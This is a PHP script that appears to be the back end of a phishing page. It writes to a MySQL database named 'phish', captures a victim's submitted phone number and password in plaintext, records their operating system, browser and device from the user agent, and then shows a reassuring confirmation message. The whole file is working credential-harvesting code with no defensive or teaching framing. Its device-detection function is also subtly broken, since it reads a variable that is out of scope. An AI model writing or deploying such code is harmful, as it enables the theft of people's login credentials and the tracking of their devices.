<?php

// Establish a connection to your MySQL database
$servername = "localhost";
$username = "root";
$password = "";
$database = "phish";

$conn = new mysqli($servername, $username, $password, $database);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform  = "Unknown OS Platform";

    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {

    global $user_agent;

    $browser        = "Unknown Browser";

    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}

function getDeviceName() {
    // Attempt to extract device name from user agent
    $device_name = "Unknown Device";
    
    // Example regex pattern for detecting iPhone model names
    if (preg_match('/iPhone\s+([^\s;]+)/i', $user_agent, $matches)) {
        $device_name = $matches[0];
    }
    // Add more patterns for other devices as needed
    
    return $device_name;
}

$user_os        = getOS();
$user_browser   = getBrowser();
$contact_number = $_POST['contact_number']; // Get contact number from the submitted form
$password       = $_POST['password']; // Get password from the submitted form
$device_name    = getDeviceName();

// Prepare and bind the SQL statement
$stmt = $conn->prepare("INSERT INTO user_info (contact_number, password, user_browser, user_os, device_name) VALUES (?, ?, ?, ?, ?)");
$stmt->bind_param("sssss", $contact_number, $password, $user_browser, $user_os, $device_name);

// Execute the statement
$stmt->execute();

// Close the statement and the connection
$stmt->close();
$conn->close();

// Output a message to indicate successful submission
echo "Thank you for your submission! Your information has been recorded.";

?>